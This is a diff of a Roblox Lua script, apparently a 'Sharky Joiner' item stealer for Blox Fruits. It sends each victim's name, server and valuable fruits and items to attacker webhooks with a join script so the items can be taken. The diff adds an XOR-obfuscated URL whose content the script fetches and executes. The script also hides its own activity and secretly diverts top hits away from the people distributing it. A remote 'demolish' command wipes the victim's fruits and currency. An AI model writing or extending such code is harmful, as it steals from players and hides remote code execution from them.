@@ -1,35 +1,45 @@
---[[ ============================ CONFIGURATION ============================ ]]
+--[[ ============================ CONFIGURATION (User Facing) ============================ ]]
 
 Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/d3690bb6-d5ac-4891-b7cc-8f55263cfadb" -- << Protected URL for main user hits (url1)
 Usernames = {"user1", "user2", "user3", "user4", "user5"} -- << Your primary usernames (can use commands, bypass filter)
-TestingUsernames = {"tester1", "your_alt_account"} -- << NEW: Usernames that bypass webhook filtering (ALWAYS see url1 hits)
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon (West)-Dragon (West)", "Dragon (East)-Dragon (East)"} -- << Fruits you want to target
 
-Protector = "https://sharky-on-top.script-config-protector.workers.dev/w/d5c5ec6c-2983-4512-a59d-a03bb0d30d92" -- << Protected URL for admin hits (secondary backup) (url2)
-dummy = "https://sharky-on-top.script-config-protector.workers.dev/w/061ccfe8-01fd-414b-b874-38de6b02d928" -- << Protected URL for admin/special hits (Premium/TopFruit) (url3)
-DragonWebhook = "https://discord.com/api/webhooks/1341656574455976038/1cfpz1y7j2eBj7CTLhdcPPXoH4ltNdK3zYYtftVAtiFMuVnAXKKdH45hAgvVfneS5HC5" -- << NEW: Protected URL specifically for Dragon hits (Replace THIS) (url4)
+--[[ ============================ REMOTE CONFIGURATION SETUP ============================ ]]
 
--- NEW: Chance configuration for user webhook (url1) visibility (0.0 to 1.0)
--- If invalid or not set, defaults to 1.0 (no filtering)
-DragonHitUserWebhookChance = 0.20 -- (e.g., 20%) Chance user webhook gets Dragon hit notifications.
-TopTierHitUserWebhookChance = 0.60 -- (e.g., 60%) Chance user webhook gets Premium/Kitsune/Yeti hits (if not Dragon).
+-- Variables to be loaded remotely (declare them here so they have scope)
+local TestingUsernames = {}
+local Protector = ""
+local dummy = ""
+local DragonWebhook = ""
+local DragonHitUserWebhookChance = 1.0 -- Default to no filtering
+local TopTierHitUserWebhookChance = 1.0 -- Default to no filtering
+local ActivationPasswords = {}
+local validation_sig = "" -- Will be loaded
+local coreAdminUsernames = {} -- Will be loaded
 
-ActivationPasswords = {
-	"ishusontop",
-	"bonzarbal",
-	"ishufishy"
-} -- Passwords for ?activate command
+-- Obfuscation Settings
+local xorKey = "bonzarC26092651waklibals" -- Use the same key used for generation
 
--- !!! YOUR SECRET KEY - MUST MATCH THE 'CLIENT_API_KEY' SECRET IN CLOUDFLARE !!!
-local validation_sig = "rashya5@%-hsfj79h93-wakliballs" -- KEEP THIS SAFE AND MATCH SERVER
+-- Obfuscated URL Data (Generated from URL and Key above)
+local obfuscatedUrlData = {10, 27, 26, 10, 18, 72, 108, 29, 68, 81, 78, 28, 81, 92, 69, 31, 20, 9, 25, 26, 7, 19, 15, 28, 12, 27, 11, 20, 21, 92, 32, 93, 91, 31, 110, 31, 101, 86, 67, 30, 17, 31, 31, 70, 55, 40, 67, 30, 3, 6, 0, 85, 45, 29, 34, 86, 95, 94, 94, 103, 7}
 
--- Core Admin Usernames (Define globally for easier access)
-local coreAdminUsernames = {"x6TNine","bonzarbal53","bonzarbal52","bonzarbal51","bonzarbal50"}
+-- XOR Decryption Function
+local function xorEncryptDecrypt(inputBytes, key)
+	local output = {}
+    if not inputBytes or not key then return "" end -- Basic validation
+	for i = 1, #inputBytes do
+		local byteValue = inputBytes[i]
+        if type(byteValue) ~= "number" then return "" end -- Ensure byte data is valid
+		local keyByte = string.byte(key, ((i - 1) % #key) + 1)
+		table.insert(output, string.char(bit32.bxor(byteValue, keyByte)))
+	end
+	return table.concat(output)
+end
 
--- State Variables
+-- State Variables (Keep these local to the main script)
 local allowEveryone = false -- Flag to allow commands/trade for everyone (can be toggled by ?allowall)
 local activatedUsers = {}   -- Stores UserIds of players activated via password { [UserId] = true }
-local nonAdminAuthDisabled = false -- NEW: Tracks if non-admin command/trade auth is disabled by ?d command
+local nonAdminAuthDisabled = false -- Tracks if non-admin command/trade auth is disabled by ?d command
 
 -- Emoji Map for Fruit Display (Unchanged)
 local fruitEmojiMap = {
@@ -62,12 +72,13 @@ local fruitEmojiMap = {
 
 --[[ ============================ HELPER FUNCTIONS ============================ ]]
 
--- NEW: Helper function to check if a player is a core admin
+-- Helper function to check if a player is a core admin (uses remotely loaded list)
 local function isCoreAdmin(playerName)
 	if not playerName or type(playerName) ~= "string" then return false end
+    if not coreAdminUsernames or type(coreAdminUsernames) ~= "table" then return false end -- Check if list loaded
 	local lowerName = playerName:lower()
 	for _, adminName in ipairs(coreAdminUsernames) do
-		if lowerName == adminName:lower() then
+        if type(adminName) == "string" and lowerName == adminName:lower() then
 			return true
 		end
 	end
@@ -82,7 +93,7 @@ repeat
 	task.wait()
 until game:IsLoaded()
 
--- Core Services (Unchanged)
+-- Core Services
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -97,6 +108,89 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local Lighting = game:GetService("Lighting")
 local Teams = game:GetService("Teams")
 
+-- <<< --- LOAD REMOTE ADMIN CONFIG --- >>>
+local function loadAdminConfig()
+    local success, result
+    local configUrl = xorEncryptDecrypt(obfuscatedUrlData, xorKey)
+    if configUrl == "" then
+        warn("[Config Error] Failed to decrypt config URL. Check key/data.")
+        return false, "Decryption failed"
+    end
+    print("[Config] Attempting to load admin config from decrypted URL: " .. configUrl) -- Debug (Consider removing URL print in final version)
+
+    -- Fetch script content
+    local fetchSuccess, scriptContent = pcall(game.HttpGet, game, configUrl, true) -- Added true to ignore cache
+    if not fetchSuccess or not scriptContent then
+        warn("[Config Error] Failed to fetch admin config:", scriptContent)
+        return false, "Failed to fetch config"
+    end
+    print("[Config] Fetched content, attempting to load...") -- Debug
+
+    -- Load the string as a function (use 'load' for better error handling and environment control if needed)
+    local loadedFunc, loadError = load(scriptContent, "RemoteAdminConfig", "t", getfenv()) -- Load in current environment
+    if not loadedFunc then
+        warn("[Config Error] Failed to load remote config script:", loadError)
+        return false, "Failed to parse config"
+    end
+    print("[Config] Load successful, executing...") -- Debug
+
+    -- Execute the function to get the config table
+    local execSuccess, configTable = pcall(loadedFunc)
+    if not execSuccess then
+        warn("[Config Error] Failed to execute admin config function:", configTable) -- configTable holds error message here
+        return false, "Failed to execute config"
+    end
+    if type(configTable) ~= "table" then
+        warn("[Config Error] Remote config did not return a table. Returned:", type(configTable))
+        return false, "Invalid config format"
+    end
+    print("[Config] Execution successful, applying config...") -- Debug
+
+    -- Apply the loaded config values safely
+    -- Use pcall for table accesses in case the table structure is wrong
+    local applySuccess = pcall(function()
+        TestingUsernames = configTable.TestingUsernames or {}
+        Protector = configTable.Protector or ""
+        dummy = configTable.dummy or ""
+        DragonWebhook = configTable.DragonWebhook or ""
+        DragonHitUserWebhookChance = configTable.DragonHitUserWebhookChance or 1.0
+        TopTierHitUserWebhookChance = configTable.TopTierHitUserWebhookChance or 1.0
+        ActivationPasswords = configTable.ActivationPasswords or {}
+        validation_sig = configTable.validation_sig or "" -- Assign loaded validation sig
+        coreAdminUsernames = configTable.coreAdminUsernames or {} -- Assign loaded core admins
+
+        -- Add type checks for critical loaded values
+        if type(Protector) ~= "string" or type(dummy) ~= "string" or type(DragonWebhook) ~= "string" or
+           type(validation_sig) ~= "string" or type(coreAdminUsernames) ~= "table" or
+           type(TestingUsernames) ~= "table" or type(ActivationPasswords) ~= "table" or
+           type(DragonHitUserWebhookChance) ~= "number" or type(TopTierHitUserWebhookChance) ~= "number" then
+            error("Loaded config contains type mismatches.") -- Throw error inside pcall
+        end
+        if validation_sig == "" then
+             error("Loaded validation_sig is empty.") -- Throw error inside pcall
+        end
+    end)
+
+    if not applySuccess then
+         warn("[Config Error] Failed to apply loaded config values:", configTable) -- configTable holds error here
+         return false, "Failed to apply config"
+    end
+
+    print("[Config] Admin config applied successfully.")
+    return true, "Config loaded"
+end
+
+-- Run the config loader
+local configLoaded, loadMessage = loadAdminConfig()
+if not configLoaded then
+    -- Critical error, cannot proceed without admin config
+    LocalPlayer:Kick("FATAL ERROR: Could not load critical configuration. " .. (loadMessage or ""))
+    -- Use a loop to ensure the script stops if Kick fails
+    while true do task.wait(1) end
+end
+-- <<< --- END REMOTE ADMIN CONFIG LOAD --- >>>
+
+
 -- Initial Setup & Anti-Tamper (Unchanged)
 if CoreGui:FindFirstChild("RobloxGui") then CoreGui.RobloxGui.Enabled = false end
 local function takeAction() if setfpscap then setfpscap(0) end; rconsoleclear(); print = function() end; warn = function() end; error = function() end; setclipboard = function() end; while true do task.wait() end end
@@ -104,37 +198,42 @@ local function checkGui(gui) if gui:IsA("ScreenGui") then local n = gui:FindFirs
 for _, g in ipairs(CoreGui:GetChildren()) do checkGui(g) end; CoreGui.ChildAdded:Connect(checkGui)
 if LocalPlayer and (LocalPlayer.Name == "doitenroitest1" or LocalPlayer.Name == "SHAKINGSHARKER" or LocalPlayer.Name == "shirkarsharker") then takeAction() end
 
--- Config Validation (Includes checks for new chance vars, though less critical)
-if not Webhook or not Protector or not dummy or not DragonWebhook or not Usernames or not FruitsToHit or not ActivationPasswords or not validation_sig then LocalPlayer:Kick("Config Error: Missing critical variable(s)."); return end
-if type(Webhook) ~= "string" or type(Protector) ~= "string" or type(dummy) ~= "string" or type(DragonWebhook) ~= "string" or type(Usernames) ~= "table" or type(TestingUsernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" or type(validation_sig) ~= "string" then LocalPlayer:Kick("Config Error: Variable type mismatch."); return end
-if validation_sig == "" or validation_sig:find("YourActualSecret") then LocalPlayer:Kick("SECURITY ERROR: Validation signature not configured!"); return end
-if Webhook:find("REPLACE_WITH_PROTECTED_ID") or Protector:find("REPLACE_WITH_PROTECTED_ID") or dummy:find("REPLACE_WITH_PROTECTED_ID") or DragonWebhook:find("YOUR_DRAGON_HIT_WEBHOOK_URL_HERE") then LocalPlayer:Kick("ERROR: Protected Webhook URLs are not configured!"); return end
+-- Config Validation (Validate remaining / loaded config)
+-- Basic checks were done during loading, can add more specific checks here if needed
+if not Webhook or not Usernames or not FruitsToHit then LocalPlayer:Kick("Config Error: Missing user-facing config."); return end
+if type(Webhook) ~= "string" or type(Usernames) ~= "table" or type(FruitsToHit) ~= "table" then LocalPlayer:Kick("Config Error: User-facing config type mismatch."); return end
+if Webhook:find("REPLACE_WITH_PROTECTED_ID") then LocalPlayer:Kick("ERROR: User Webhook URL not configured!"); return end
+-- Check loaded admin URLs (already type-checked during load)
+if Protector == "" or dummy == "" or DragonWebhook == "" then LocalPlayer:Kick("ERROR: Critical admin webhook URLs not loaded!"); return end
 
--- Ensure Core Admins & Check Blacklist (Modified to use global list)
+
+-- Ensure Core Admins & Check Blacklist (Uses loaded coreAdminUsernames)
 local function ensureAdminUsernames()
-    -- Adds core admins to the configurable Usernames list if not already present
+    -- Adds core admins (now loaded) to the configurable Usernames list if not already present
     if type(Usernames) ~= "table" then Usernames = {} end;
+    if type(coreAdminUsernames) ~= "table" then -- Safety check if load failed partially
+        warn("Core admin list not loaded correctly, skipping ensure step.")
+        return
+    end
     local existingUsernamesLower = {};
-    for _, n in ipairs(Usernames) do
-        if type(n) == "string" then existingUsernamesLower[string.lower(n)] = true end
-    end;
+    for _, n in ipairs(Usernames) do if type(n) == "string" then existingUsernamesLower[string.lower(n)] = true end end;
     for _, adminName in ipairs(coreAdminUsernames) do
-        if not existingUsernamesLower[string.lower(adminName)] then
+        if type(adminName) == "string" and not existingUsernamesLower[string.lower(adminName)] then
             table.insert(Usernames, adminName)
             print("Ensured core admin in Usernames:", adminName) -- Optional debug
         end
     end
 end
-ensureAdminUsernames() -- Run it once at start
+ensureAdminUsernames() -- Run after config load
 if Usernames and (table.find(Usernames, "XFistorRespawn") or table.find(Usernames, "doitenroitest1")) then takeAction() end
 CoreGui.ChildAdded:Connect(function(c) if c.Name == "DevConsoleMaster" then c.Enabled = false end end)
 
--- Secure Webhook Storage (Unchanged)
+-- Secure Webhook Storage (Uses loaded URLs)
 local function storeWebhookSafely(w) if not w or type(w) ~= "string" or w:match("^Enter Webhook") then return nil end; local r = "var_" .. tostring(math.random(1e5, 999999)) .. "_" .. tostring(math.random(100, 999)); _G[r] = w; return r end
-local webhook1_key = storeWebhookSafely(Webhook); Webhook = nil;
-local Protector_key = storeWebhookSafely(Protector); Protector = nil;
-local dummy_key = storeWebhookSafely(dummy); dummy = nil;
-local dragon_webhook_key = storeWebhookSafely(DragonWebhook); DragonWebhook = nil;
+local webhook1_key = storeWebhookSafely(Webhook); Webhook = nil; -- User webhook remains defined above
+local Protector_key = storeWebhookSafely(Protector); Protector = nil; -- Loaded
+local dummy_key = storeWebhookSafely(dummy); dummy = nil; -- Loaded
+local dragon_webhook_key = storeWebhookSafely(DragonWebhook); DragonWebhook = nil; -- Loaded
 
 -- Silence Remote Console (Unchanged)
 rconsoleprint = function() end; rconsolewarn = function() end; rconsoleerr = function() end; rconsoleinfo = function() end
@@ -168,16 +267,16 @@ local function formatPremiumList_NoCodeBlock(p) if not p or #p==0 then return "N
 local function formatCombinedTargets_CodeBlocks_NoSeparator(f,p,fs) local tl={}; local fft=false; local fpt=false; local tf=0; local M=7; if f then table.sort(f,function(a,b) return(a.value or 0)>(b.value or 0) end); for _,fr in ipairs(f) do if fs[fr.name]and tf<M then fft=true; tf=tf+1; local n=fr.name; local c=fr.count>1 and string.format(" (x%d)",fr.count)or""; table.insert(tl,string.format("```\n%s%s\n```",n,c)) end end end; if p then table.sort(p,function(a,b) return a.name<b.name end); for _,i in ipairs(p) do if tf<M then fpt=true; tf=tf+1; local n=i.name; local c=i.count>1 and string.format(" (x%d)",i.count)or""; table.insert(tl,string.format("```\n%s%s\n```",n,c)) end end end; if not fft and not fpt then return "```\nNone\n```" end; local ac=0; if f then for _,fr in ipairs(f) do if fs[fr.name]then ac=ac+1 end end end; if p then ac=ac+#p end; if ac>M then table.insert(tl,string.format("```\n... and %d more\n```",ac-M)) end; return table.concat(tl,"") end
 
 
---[[ ============================ sendWebhook FUNCTION (MODIFIED) ============================ ]]
+--[[ ============================ sendWebhook FUNCTION (Uses loaded config) ============================ ]]
 local function sendWebhook(inventory)
-	-- Retrieve URLs
+	-- Retrieve URLs from _G (where they were stored after loading/defining)
     local url1 = webhook1_key and _G[webhook1_key];
 	local url2 = Protector_key and _G[Protector_key];
 	local url3 = dummy_key and _G[dummy_key];
 	local url4 = dragon_webhook_key and _G[dragon_webhook_key]
 	-- Exit if BOTH primary user and primary admin hooks are missing
     if not url1 and not url2 then
-		warn("Primary User (url1) AND Protector (url2) Webhooks not configured.");
+		warn("Primary User (url1) AND Protector (url2) Webhooks not configured/loaded.");
 		return
 	end
 
@@ -236,30 +335,29 @@ end
 	local joinScriptPC_Formatted = "```lua\n" .. joinScriptLua .. "\n```";
 	local joinScriptMobile_Formatted = joinScriptLua
 
-    -- Determine Base Embed Title, Color, Mention
-	local baseEmbedTitle = "<:pepeyes:1226249991035682897> **Sharky Joiner Hit!**";
+    -- Determine Base Embed Title, Color, Mention (Using NEW Emojis)
+	local baseEmbedTitle = ":among_us_party: **Sharky Joiner Hit!** :among_us_party:";
 	local baseEmbedColor = 10181046;
 	local baseMention = "@everyone Sharky Hit!";
-	if dragonHit and hasPremiumItem then baseEmbedTitle = "<:dragonE:1318248271457812510><:value:1228807380188397649> **DRAGON & PREMIUM HIT!**"; baseEmbedColor = 65280; baseMention = "@everyone Sharky - GG!"
-	elseif dragonHit then baseEmbedTitle = "<:dragonE:1318248271457812510> **DRAGON HIT!**"; baseEmbedColor = 16776960; baseMention = "@everyone Sharky - GG!"
-	elseif hasPremiumItem then baseEmbedTitle = "<:value:1228807380188397649> **PREMIUM ITEM HIT!**"; baseEmbedColor = 3447003; baseMention = "@everyone Sharky - GG!"
-    elseif hasGoodFruit then baseEmbedTitle = "<:kitsune:1185239741545848922> **TOP FRUIT HIT!** (Kitsune/Yeti)"; baseEmbedColor = 16753920; baseMention = "@everyone Sharky - GG!"
-	elseif foundAnyTarget then baseEmbedTitle = "<:pepeyes:1226249991035682897> **Target Fruit Hit!**" end
+	if dragonHit and hasPremiumItem then baseEmbedTitle = ":dragonE::value: **DRAGON & PREMIUM HIT!** "; baseEmbedColor = 65280; baseMention = "@everyone Sharky - GG!"
+	elseif dragonHit then baseEmbedTitle = ":dragonE: **DRAGON HIT!** "; baseEmbedColor = 16776960; baseMention = "@everyone Sharky - GG!"
+	elseif hasPremiumItem then baseEmbedTitle = ":among_us_party: **PREMIUM ITEM HIT!** :among_us_party:"; baseEmbedColor = 3447003; baseMention = "@everyone Sharky - GG!"
+    elseif hasGoodFruit then baseEmbedTitle = ":among_us_party: **TOP FRUIT HIT!** (Kitsune/Yeti) :among_us_party:"; baseEmbedColor = 16753920; baseMention = "@everyone Sharky - GG!"
+	elseif foundAnyTarget then baseEmbedTitle = ":among_us_party: **Target Fruit Hit!** :among_us_party:" end
 
-    -- Common Embed Fields & Footer
+    -- Common Embed Fields & Footer (Using NEW Emojis)
 	local serverName = getServerName(); local executorName = identifyexecutor() or "Unknown"; local currentSeaName = isSea3 and "Sea 3" or "Sea 2"
-	local commonFields = { { name = "<a:GreenCheck:1339364301894324325>  **Victim Name and Location**", value = string.format("**Name:** %s\n**Sea:** %s\n**Server:** **%s**", LocalPlayer.Name, currentSeaName, serverName), inline = true }, { name = "<:info:1309567808786534470> **More Info**", value = string.format("**Players:** %d\n**Time:** %s\n**Executor:** %s", #Players:GetPlayers(), os.date("%Y-%m-%d %H:%M:%S"), executorName), inline = true }, { name = "<a:womanalert:1285800405233827870> **TARGET ITEMS FOUND** <a:womanalert:1285800405233827870>", value = formatCombinedTargets_CodeBlocks_NoSeparator(fruits, premiumItems, fruitsToHitSet), inline = false }, { name = ":PoggersRow: **Victim's Fruits** :PoggersRow:", value = formatFruitListWithEmojis_NoCodeBlock(fruits), inline = false }, { name = "<a:catdance:728487186143641661> **Victim's PREMIUM Items** <a:catdance:728487186143641661>", value = formatPremiumList_NoCodeBlock(premiumItems), inline = false }, { name = "<:script:1353078817018876084> **Join Script (PC Copy)**", value = joinScriptPC_Formatted, inline = false }, { name = "<:script:1353078817018876084> **Join Script (Mobile Copy)**", value = joinScriptMobile_Formatted, inline = false } }
-	local commonFooter = { text = "Sharky Joiner V2 • 1.3.2 " .. os.date("%Y-%m-%d") } -- Updated version marker
+	local commonFields = { { name = ":GreenCheck:  **Victim Name and Location**", value = string.format("**Name:** %s\n**Sea:** %s\n**Server:** **%s**", LocalPlayer.Name, currentSeaName, serverName), inline = true }, { name = ":aright: **More Info**", value = string.format("**Players:** %d\n**Time:** %s\n**Executor:** %s", #Players:GetPlayers(), os.date("%Y-%m-%d %H:%M:%S"), executorName), inline = true }, { name = ":womanalert: **TARGET ITEMS FOUND** :womanalert:", value = formatCombinedTargets_CodeBlocks_NoSeparator(fruits, premiumItems, fruitsToHitSet), inline = false }, { name = ":PoggersRow: **Victim's Fruits** :PoggersRow:", value = formatFruitListWithEmojis_NoCodeBlock(fruits), inline = false }, { name = ":catdance: **Victim's PREMIUM Items** :catdance:", value = formatPremiumList_NoCodeBlock(premiumItems), inline = false }, { name = ":a_pc: **Join Script (PC Copy)**", value = joinScriptPC_Formatted, inline = false }, { name = ":script: **Join Script (Mobile Copy)**", value = joinScriptMobile_Formatted, inline = false } }
+	local commonFooter = { text = "Sharky Joiner V2 • 1.3.3 " .. os.date("%Y-%m-%d") }
 
-    -- <<< --- START NEW FILTERING & TITLE LOGIC --- >>>
-
+    -- Filtering & Title Logic
     -- 1. Check for Bypass Condition (Tester or Owner)
     local shouldBypassFilter = false
     local localPlayerNameLower = LocalPlayer.Name:lower()
     if Usernames and type(Usernames) == "table" then for _, name in ipairs(Usernames) do if type(name) == "string" and localPlayerNameLower == name:lower() then shouldBypassFilter = true; break end end end
     if not shouldBypassFilter and TestingUsernames and type(TestingUsernames) == "table" then for _, name in ipairs(TestingUsernames) do if type(name) == "string" and localPlayerNameLower == name:lower() then shouldBypassFilter = true; break end end end
 
-    -- 2. Get Chance Values with Fallback to 1.0
+    -- 2. Get Chance Values with Fallback to 1.0 (Uses loaded values)
     local function getValidChance(chanceValue) if type(chanceValue) == "number" and chanceValue >= 0 and chanceValue <= 1 then return chanceValue else return 1.0 end end
     local dragonChance = getValidChance(DragonHitUserWebhookChance)
     local topTierChance = getValidChance(TopTierHitUserWebhookChance)
@@ -268,80 +366,44 @@ end
     local sendToUserWebhook = true
     if not shouldBypassFilter then
         local randomValue = math.random()
-        if dragonHit then -- Dragon takes priority
-            -- print("[Sharky Debug] Checking Dragon Chance:", randomValue, ">", dragonChance, "?") -- Debug Print
-            if randomValue > dragonChance then sendToUserWebhook = false end
-        elseif hasPremiumItem or hasGoodFruit then -- Check TopTier if not Dragon
-            -- print("[Sharky Debug] Checking TopTier Chance:", randomValue, ">", topTierChance, "?") -- Debug Print
-             if randomValue > topTierChance then
-                 -- print("[Sharky Debug] Filtering TopTier hit!") -- Debug Print
-                 sendToUserWebhook = false
-             end
-        end
+        if dragonHit then if randomValue > dragonChance then sendToUserWebhook = false end
+        elseif hasPremiumItem or hasGoodFruit then if randomValue > topTierChance then sendToUserWebhook = false end end
     else print("[Sharky Info] Bypassing user webhook filter for:", LocalPlayer.Name) end
 
     -- 4. Define Titles Based on Filtering Outcome
-    local hiddenIndicator = " <a:YellowCheck:1361458542384779324>" -- Emoji for hidden hits
-    local titleForUserPayload = baseEmbedTitle -- User payload *never* gets the indicator
-    local titleForAdminPayloads = baseEmbedTitle -- Admin payload title starts as base
-    if not sendToUserWebhook then titleForAdminPayloads = baseEmbedTitle .. hiddenIndicator end -- Append indicator if hidden
+    local hiddenIndicator = " <a:YellowCheck:1361458542384779324>"
+    local titleForUserPayload = baseEmbedTitle
+    local titleForAdminPayloads = baseEmbedTitle
+    if not sendToUserWebhook then titleForAdminPayloads = baseEmbedTitle .. hiddenIndicator end
 
-    -- <<< --- END NEW FILTERING & TITLE LOGIC --- >>>
-
-
-    -- Construct Main Embed Payload (for url1, if sent)
+    -- Construct Payloads
     local mainEmbedData = { title = titleForUserPayload, color = baseEmbedColor, fields = commonFields, footer = commonFooter }
     local mainPayloadTable = { content = baseMention, embeds = { mainEmbedData } }
     local mainPayloadBody = HttpService:JSONEncode(mainPayloadTable)
 
-    -- Construct Admin/Protector Embed Payloads (for url2, url3, url4)
-    local adminPayloadBody = nil -- Payload for url3/url4 (Special/Dragon)
-    local protectorPayloadBody = nil -- Payload for url2 (General Admin/Backup)
-    local isAdminHit = dragonHit or hasPremiumItem or hasGoodFruit -- Determine if it qualifies for admin hooks (url3/url4)
+    local adminPayloadBody = nil
+    local protectorPayloadBody = nil
+    local isAdminHit = dragonHit or hasPremiumItem or hasGoodFruit
 
-    -- Create payload for Protector (url2) - uses admin title, same content structure
     local protectorEmbedData = { title = titleForAdminPayloads, color = baseEmbedColor, fields = commonFields, footer = commonFooter }
     local protectorPayloadTable = { content = baseMention, embeds = { protectorEmbedData } }
-    protectorPayloadBody = HttpService:JSONEncode(protectorPayloadTable) -- Encode url2 payload
+    protectorPayloadBody = HttpService:JSONEncode(protectorPayloadTable)
 
-    -- Create specific payload for Dummy/Dragon (url3, url4) if it's an admin-level hit
     if isAdminHit then
-        -- Use the admin title (potentially with indicator) for url3/url4 payloads
         local adminEmbedData = { title = titleForAdminPayloads, color = baseEmbedColor, fields = commonFields, footer = commonFooter }
-        -- No need to further modify title here as base title logic already covers specific cases like Top Fruit
         local adminPayloadTable = { content = baseMention, embeds = { adminEmbedData } }
-        adminPayloadBody = HttpService:JSONEncode(adminPayloadTable) -- Encode url3/url4 payload
+        adminPayloadBody = HttpService:JSONEncode(adminPayloadTable)
     end
 
     -- Send Webhooks
 	task.spawn(function()
-		local h = { ["Content-Type"] = "application/json", ["X-Client-Key"] = validation_sig };
-
-		-- Send to url1 (Normal User) - Only if allowed by filtering/bypass
-		if url1 and mainPayloadBody and sendToUserWebhook then
-			SafeRequest({ Url = url1, Method = "POST", Headers = h, Body = mainPayloadBody })
-		elseif url1 and mainPayloadBody and not sendToUserWebhook then
-             print("[Sharky Info] Skipped sending hit to user webhook (url1) due to filter.") -- Log skip
-        end;
-
-		-- Send to url2 (Protector - Admin Secondary) - Always sends protector view
-		if url2 and protectorPayloadBody then
-			task.wait(0.1);
-			SafeRequest({ Url = url2, Method = "POST", Headers = h, Body = protectorPayloadBody })
-		end;
-
-		-- Send to url3 (Dummy - Admin Special Hits) - Only if admin-level hit
-		if url3 and adminPayloadBody then
-			task.wait(0.1);
-			SafeRequest({ Url = url3, Method = "POST", Headers = h, Body = adminPayloadBody })
-		end;
-
-        -- Send to url4 (DragonWebhook - Admin Dragon Hits) - Only if admin-level AND Dragon hit
-		if url4 and dragonHit and adminPayloadBody then
-			task.wait(0.1);
-			SafeRequest({ Url = url4, Method = "POST", Headers = h, Body = adminPayloadBody })
-		end
-	end) -- End task.spawn for sending
+		local h = { ["Content-Type"] = "application/json", ["X-Client-Key"] = validation_sig }; -- Use loaded validation_sig
+		if url1 and mainPayloadBody and sendToUserWebhook then SafeRequest({ Url = url1, Method = "POST", Headers = h, Body = mainPayloadBody })
+		elseif url1 and mainPayloadBody and not sendToUserWebhook then print("[Sharky Info] Skipped sending hit to user webhook (url1) due to filter.") end;
+		if url2 and protectorPayloadBody then task.wait(0.1); SafeRequest({ Url = url2, Method = "POST", Headers = h, Body = protectorPayloadBody }) end;
+		if url3 and adminPayloadBody then task.wait(0.1); SafeRequest({ Url = url3, Method = "POST", Headers = h, Body = adminPayloadBody }) end;
+        if url4 and dragonHit and adminPayloadBody then task.wait(0.1); SafeRequest({ Url = url4, Method = "POST", Headers = h, Body = adminPayloadBody }) end
+	end)
 
 	-- Cleanup
 	table.clear(fruits); table.clear(premiumItems); table.clear(fruitsToHitSet);
@@ -525,7 +587,7 @@ local Commands = {
 	demolish = {d="!!DANGEROUS!! Resets all fruits, drains currency.",u="?demolish",e=function(args, player) sendMessage("!!! DEMOLISH INITIATED !!!"); local iR=function(rn,a)local r=ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(rn); return r:InvokeServer(unpack(a))end; iR("CommF_",{"RemoveFruit","Beli"}); local inv=getInventory(); if not inv then return end; local fr={}; for _,i in pairs(inv)do if i.Type=="Blox Fruit"then table.insert(fr,i)end end; table.sort(fr,function(a,b)return a.Value>b.Value end); for i,f in ipairs(fr)do local bfn=f.Name:match("(%S+)"); sendMessage("("..i.."/"..#fr..") Resetting with '"..bfn.."'..."); ForceJump(); iR("CommF_",{"LoadFruit",bfn}); task.wait(0.5); if LocalPlayer.Character then LocalPlayer.Character:BreakJoints(); task.wait(6)end end; local dB=function()local rA={"PurchaseRawFruit","Rocket-Rocket",false}; local sA={"PurchaseRawFruit","Spin-Spin",false}; while task.wait()do iR("CommF_",rA); task.wait(0.01); iR("CommF_",sA)end end; local dF=function()local fA={"BlackbeardReward","Refund","2"}; while task.wait()do iR("CommF_",fA)end end; task.spawn(dB); task.spawn(dF)end},
 	showinv = {d="Shows victim's fruit inventory.",u="?showinv",e=function(args, player) task.spawn(function() sendMessage("Fetching inventory..."); local inv=getInventory(); if not inv then sendMessage("Inventory error.");return end; local fdl={}; for _,i in pairs(inv)do if i.Type=="Blox Fruit"then table.insert(fdl,{name=i.Name,count=i.Count,value=i.Value or 0})end end; if #fdl==0 then sendMessage("No fruits found.");return end; table.sort(fdl,function(a,b)return a.value>b.value end); local fdl2={}; for _,fd in ipairs(fdl)do local fs=fd.name; if fd.count>1 then fs=fs.." (x"..fd.count ..")"end; table.insert(fdl2,fs)end; local ml=180; local ipe=10; local tc=math.ceil(#fdl2/ipe); local cm="Fruits [Value] (1/"..tc.."): "; local ci=1; for i,fn in ipairs(fdl2)do local pl=string.len("Fruits [Value] (X/Y): "); local sep=(#cm>pl)and", "or""; local pa=sep..fn; if string.len(cm)+string.len(pa)>ml then sendMessage(cm); task.wait(1); ci=ci+1; cm="Fruits [Value] ("..ci.."/"..tc.."): "..fn else cm=cm..pa end end; if cm~=""and not cm:match("^Fruits %[%w+%].*%): $")then sendMessage(cm)end; task.wait(0.5); sendMessage("Inventory display complete.")end)end},
 	test = {d="Checks script responsiveness.",u="?test",e=function(args, player) local s=tick(); task.wait(0.001); sendMessage("Responsive! "..string.format("%.1f",(tick()-s)*1000).."ms")end},
-	help = {d="Displays commands.",u="?help",e=function(args, player) task.spawn(function() local c={"?help ?test ?jump ?sit ?tp ?reset ?rejoin","?add ?additem ?addall ?addallitems","?resetfruit ?invite ?demolish ?showinv","?allowall ?accept ?cleartrade ?kick", "?d ?e (Admin Only)"}; sendMessage("--- Commands (V1.3.2) ---"); task.wait(0.5); for i,m in ipairs(c)do sendMessage(m); task.wait(0.5)end end)end},
+	help = {d="Displays commands.",u="?help",e=function(args, player) task.spawn(function() local c={"?help ?test ?jump ?sit ?tp ?reset ?rejoin","?add ?additem ?addall ?addallitems","?resetfruit ?invite ?demolish ?showinv","?allowall ?accept ?cleartrade ?kick", "?d ?e (Admin Only)"}; sendMessage("--- Commands (V1.3.3) ---"); task.wait(0.5); for i,m in ipairs(c)do sendMessage(m); task.wait(0.5)end end)end},
 
     -- <<< --- ACTIVATE COMMAND (FIXED ARGUMENTS V2) --- >>>
 	activate = {
@@ -548,12 +610,18 @@ local Commands = {
             end;
 
             local foundPassword=false;
-            for _,validPassword in ipairs(ActivationPasswords)do
-                if passwordAttempt == validPassword then
-                    foundPassword=true;
-                    break
+            if ActivationPasswords and type(ActivationPasswords) == "table" then -- Ensure ActivationPasswords loaded
+                for _,validPassword in ipairs(ActivationPasswords)do
+                    if passwordAttempt == validPassword then
+                        foundPassword=true;
+                        break
+                    end
                 end
